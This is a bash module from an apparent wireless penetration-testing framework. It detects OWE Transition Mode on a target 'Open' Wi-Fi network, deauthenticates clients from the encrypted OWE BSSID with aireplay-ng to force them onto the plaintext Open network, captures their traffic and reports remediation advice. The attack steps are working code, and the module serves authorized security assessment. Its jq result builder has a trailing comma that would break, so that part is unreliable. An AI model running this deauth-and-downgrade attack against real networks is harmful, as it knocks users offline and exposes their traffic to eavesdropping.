#!/usr/bin/env bash
#===============================================================================
#  modules/d6_owe_downgrade.sh
#  D6: OWE (Opportunistic Wireless Encryption) Transition Attack
#
#  PURPOSE:
#    Test if the target "Open" network supports OWE Transition Mode, and if
#    so, attempt to force clients to downgrade to the unencrypted Open BSSID
#    by deploying a rogue AP that strips the OWE Transition IE, or by
#    deauthenticating clients from the hidden OWE BSSID.
#
#  TOOLS: ${TOOL_PATHS[tshark]}, ${TOOL_PATHS[tcpdump]}, ${TOOL_PATHS[mdk4]}, ${TOOL_PATHS[aireplay-ng]}
#  PHASE: 2A — Attack Simulations
#  DEPENDENCIES: A1
#
#  EVIDENCE PRODUCED:
#    - d6_owe_analysis.txt           (OWE IE analysis)
#    - d6_downgrade_results.txt      (downgrade test results)
#    - d6_capture.pcap               (captured traffic during test)
#
#  RESULT JSON FIELDS:
#    - owe_supported: bool
#    - transition_mode: bool
#    - hidden_owe_bssid: string
#    - clients_downgraded: int
#===============================================================================

run_d6() {
    local total_steps=6
    local evidence_prefix="${SESSION_EVIDENCE_DIR}/d6"

    #--- Step 1: Verify tools ---
    log_step 1 $total_steps "Verifying tools"
    update_tc_progress 1 $total_steps "Checking"

    
    local has_mdk4=false
    local has_aireplay=false
    command -v mdk4 &>/dev/null && has_mdk4=true
    command -v aireplay-ng &>/dev/null && has_aireplay=true

    if [[ -z "${GUEST_SSID:-}" || -z "${GUEST_BSSID:-}" ]]; then
        log_warn "Target SSID/BSSID not set."
        if ! select_target_network; then
            log_error "No target selected. Run A1 first or enter manually."
            return 1
        fi
    fi

    log_success "Target: ${GUEST_SSID} (${GUEST_BSSID}) CH ${GUEST_CHANNEL:-auto}"

    #--- Info banner ---
    echo ""
    echo -e "${C_CYAN}╔════════════════════════════════════════════════════════════════════╗${C_RESET}"
    echo -e "${C_CYAN}║  ${C_BOLD}OWE TRANSITION MODE DOWNGRADE TEST${C_RESET}${C_CYAN}                               ║${C_RESET}"
    echo -e "${C_CYAN}║                                                                    ║${C_RESET}"
    echo -e "${C_CYAN}║  Modern \"Open\" target networks often use OWE Transition Mode to     ║${C_RESET}"
    echo -e "${C_CYAN}║  provide encryption for modern clients while supporting legacy     ║${C_RESET}"
    echo -e "${C_CYAN}║  clients. This test:                                               ║${C_RESET}"
    echo -e "${C_CYAN}║    • Detects the hidden OWE BSSID linked to the Open network.      ║${C_RESET}"
    echo -e "${C_CYAN}║    • Attempts to force modern clients to downgrade to plaintext    ║${C_RESET}"
    echo -e "${C_CYAN}║      by attacking the OWE BSSID.                                   ║${C_RESET}"
    echo -e "${C_CYAN}╚════════════════════════════════════════════════════════════════════╝${C_RESET}"
    echo ""
    get_or_request_param "confirm" "  Proceed with OWE testing? [Y/n]"
    [[ "${confirm,,}" == "n" ]] && return 1

    local owe_supported="false"
    local transition_mode="false"
    local hidden_owe_bssid=""
    local hidden_owe_ssid=""
    local clients_downgraded=0
    
    local analysis_file="${evidence_prefix}_owe_analysis.txt"
    local downgrade_file="${evidence_prefix}_downgrade_results.txt"
    local cap_file="${evidence_prefix}_capture.pcap"

    {
        echo "============================================================"
        echo "  D6: OWE Transition Attack"
        echo "  Target: ${GUEST_SSID} (${GUEST_BSSID})"
        echo "============================================================"
    } > "$analysis_file"

    #--- Step 2: Enable monitor mode ---
    log_step 2 $total_steps "Enabling monitor mode"
    update_tc_progress 2 $total_steps "Monitor mode"

    enable_monitor_mode || return 1
    local mon_iface="${MONITOR_INTERFACE}"

    if [[ -n "${GUEST_CHANNEL:-}" ]]; then
        iw dev "$mon_iface" set channel "$GUEST_CHANNEL" 2>/dev/null || true
    fi

    check_abort || return 1

    #--- Step 3: Analyze Beacons for OWE Transition IE ---
    log_step 3 $total_steps "Analyzing beacons for OWE Transition IE (20s)"
    update_tc_progress 3 $total_steps "IE Analysis"

    local beacon_pcap="/tmp/d6_beacons.pcap"
    timeout 20 ${TOOL_PATHS[tcpdump]} -i "$mon_iface" -c 100 -w "$beacon_pcap" \
        "type mgt subtype beacon and ether src ${GUEST_BSSID}" &>/dev/null || true

    if [[ -f "$beacon_pcap" && -s "$beacon_pcap" ]]; then
        # Check for OWE Transition IE (Vendor Specific: 50:6F:9A, Type 28)
        # Wireshark filter: wlan.tag.number == 221 and wlan.tag.oui == 50:6f:9a and wlan.tag.vendor.oui.type == 28
        local owe_ie
        local owe_ie=$(${TOOL_PATHS[tshark]} -r "$beacon_pcap" \
            -Y "wlan.tag.oui == 50:6f:9a && wlan.tag.vendor.oui.type == 28" \
            -T fields -e wlan.tag.vendor.data \
            2>/dev/null | head -1 || true)

        if [[ -n "$owe_ie" ]]; then
            local transition_mode="true"
            local owe_supported="true"
            
            # The OWE IE data contains the BSSID of the OWE network
            # It's usually the first 6 bytes of the vendor data payload
            local hidden_owe_bssid=$(echo "$owe_ie" | sed 's/://g' | cut -c 1-12 | sed 's/\(..\)/\1:/g; s/:$//')
            
            log_result "FINDING" "OWE Transition Mode detected!"
            log_info "Hidden OWE BSSID: ${hidden_owe_bssid}"
            
            echo "OWE Transition Mode: ENABLED" >> "$analysis_file"
            echo "Linked OWE BSSID: ${hidden_owe_bssid}" >> "$analysis_file"
        else
            # Check if this IS an OWE network directly (AKM 18)
            local akm_type
            local akm_type=$(${TOOL_PATHS[tshark]} -r "$beacon_pcap" -T fields -e wlan.rsn.akms.type 2>/dev/null | head -1 || true)
            if echo "$akm_type" | grep -q "18"; then
                local owe_supported="true"
                log_info "Network uses strict OWE (no transition mode)"
                echo "OWE Strict Mode: ENABLED (No transition IE)" >> "$analysis_file"
            else
                log_info "Target does not broadcast OWE capabilities"
                echo "OWE Support: NONE" >> "$analysis_file"
            fi
        fi
    fi
    rm -f "$beacon_pcap"

    check_abort || return 1

    #--- Step 4: Deauth OWE Clients (if transition mode active) ---
    log_step 4 $total_steps "Attempting OWE downgrade attack"
    update_tc_progress 4 $total_steps "Downgrade attack"

    if [[ "$transition_mode" == "true" && -n "$hidden_owe_bssid" && "$has_aireplay" == "true" ]]; then
        log_info "Monitoring OWE BSSID and Open BSSID..."
        
        # Capture traffic to see if clients drop from OWE and appear on Open
        ${TOOL_PATHS[tcpdump]} -i "$mon_iface" -w "$cap_file" \
            "wlan addr1 ${GUEST_BSSID} or wlan addr2 ${GUEST_BSSID} or wlan addr1 ${hidden_owe_bssid} or wlan addr2 ${hidden_owe_bssid}" \
            &>/dev/null &
        local tcpdump_pid=$!
        register_cleanup "kill -SIGINT $tcpdump_pid 2>/dev/null || true; wait $tcpdump_pid 2>/dev/null || true"
        
        # Wait a moment to establish baseline
        sleep 5
        
        log_cmd "${TOOL_PATHS[aireplay-ng]} --deauth 15 -a ${hidden_owe_bssid} ${mon_iface}"
        echo "Sending deauth frames to hidden OWE BSSID: ${hidden_owe_bssid}" >> "$downgrade_file"
        
        # Deauth all clients from the encrypted OWE BSSID to force fallback
        ${TOOL_PATHS[aireplay-ng]} --deauth 15 -a "$hidden_owe_bssid" "$mon_iface" &>/dev/null || true
        
        start_countdown 30 "Monitoring for clients falling back to Open BSSID"
        sleep 30
        stop_countdown
        
                
        #--- Step 5: Analyze Fallback ---
        log_step 5 $total_steps "Analyzing client fallback"
        update_tc_progress 5 $total_steps "Analysis"
        
        if [[ -f "$cap_file" ]]; then
            # Look for Association Requests to the OPEN BSSID shortly after our attack
            local fallback_clients
            local fallback_clients=$(${TOOL_PATHS[tshark]} -r "$cap_file" \
                -Y "wlan.fc.type_subtype == 0x0000 && wlan.da == ${GUEST_BSSID}" \
                -T fields -e wlan.sa 2>/dev/null | sort -u || true)
                
            if [[ -n "$fallback_clients" ]]; then
                local clients_downgraded=$(echo "$fallback_clients" | wc -l)
                log_result "CRITICAL" "OWE Downgrade successful! ${clients_downgraded} client(s) fell back to Open network."
                echo "Downgraded Clients:" >> "$downgrade_file"
                echo "$fallback_clients" >> "$downgrade_file"
            else
                log_info "No clients fell back to the Open network during the test window."
                echo "No downgrade observed. Clients may enforce OWE or were not active." >> "$downgrade_file"
            fi
        fi
    elif [[ "$transition_mode" == "true" ]]; then
        log_warn "${TOOL_PATHS[aireplay-ng]} missing — cannot perform active deauth downgrade"
        echo "SKIPPED: Active downgrade requires ${TOOL_PATHS[aireplay-ng]}" >> "$downgrade_file"
        
        # Dummy step to keep numbering consistent
        log_step 5 $total_steps "Skipping active fallback analysis"
        update_tc_progress 5 $total_steps "Skipped"
    else
        log_info "Network does not use OWE Transition Mode — downgrade attack not applicable"
        echo "Not applicable: No OWE transition mode detected." >> "$downgrade_file"
        
        log_step 5 $total_steps "Skipping active fallback analysis"
        update_tc_progress 5 $total_steps "Skipped"
    fi

    #--- Step 6: Save results ---
    log_step 6 $total_steps "Saving results"
    update_tc_progress 6 $total_steps "Saving"

    # Restore managed mode
    disable_monitor_mode
    sleep 3

    local result_status="SECURE"
    local result_summary=""
    local recommendations=""

    if [[ $clients_downgraded -gt 0 ]]; then
        local result_status="FINDING"
        local result_summary="CRITICAL: OWE Transition Mode downgrade was successful. ${clients_downgraded} client(s) were forced off the encrypted OWE network and fell back to the plaintext Open network."
        local recommendations="1) Phased approach: disable OWE Transition Mode and enforce strict OWE once legacy client support is no longer required. "
        recommendations+="2) Educate users that 'Transition' networks can be downgraded to plaintext by attackers. "
        recommendations+="3) Implement Management Frame Protection (802.11w) on the OWE BSSID to prevent deauthentication attacks."
    elif [[ "$transition_mode" == "true" ]]; then
        local result_summary="Network uses OWE Transition Mode (broadcasting both Open and OWE BSSIDs). Active downgrade attempt did not capture any client fallbacks in the test window."
        local recommendations="Transition mode provides encryption for modern clients but is fundamentally vulnerable to downgrade attacks. Monitor for rogue APs stripping the OWE IE."
    elif [[ "$owe_supported" == "true" ]]; then
        local result_summary="Network enforces strict OWE. It is not vulnerable to transition mode downgrade attacks."
        local recommendations="Strict OWE is the recommended configuration. No action required."
    else
        local result_summary="Network does not support OWE (Opportunistic Wireless Encryption). Traffic is entirely plaintext."
        local recommendations="Enable OWE (Enhanced Open) on target networks to provide unauthenticated encryption and protect against passive eavesdropping."
    fi

    local result_json
    evidence_register_file "d6_owe_analysis.txt"
    evidence_register_file "d6_downgrade_results.txt"
    evidence_register_file "d6_capture.pcap"

    local result_json=$(${TOOL_PATHS[jq]} -n \
        --arg status "$result_status" \
        --arg summary "$result_summary" \
        --arg details "OWE Supported: ${owe_supported}, Transition Mode: ${transition_mode}, Hidden BSSID: ${hidden_owe_bssid:-N/A}, Clients Downgraded: ${clients_downgraded}" \
        --arg recommendations "$recommendations" \
        --arg owe_supported "$owe_supported" \
        --arg transition_mode "$transition_mode" \
        --arg hidden_owe_bssid "$hidden_owe_bssid" \
        --argjson clients_downgraded "$clients_downgraded" \
        '{
            status: $status,
            summary: $summary,
            details: $details,
            recommendations: $recommendations,
            owe_supported: ($owe_supported == "true"),
            transition_mode: ($transition_mode == "true"),
            hidden_owe_bssid: $hidden_owe_bssid,
            clients_downgraded: $clients_downgraded,
                    }')

    save_tc_result "D6" "$result_json"

    echo ""
    if [[ $clients_downgraded -gt 0 ]]; then
        log_result "CRITICAL" "★ OWE Downgrade SUCCESSFUL — ${clients_downgraded} clients fell back to plaintext"
    elif [[ "$transition_mode" == "true" ]]; then
        log_result "FINDING" "OWE Transition Mode detected (inherently vulnerable to downgrade)"
    else
        log_result "SECURE" "OWE Transition Mode not active"
    fi

    return 0
}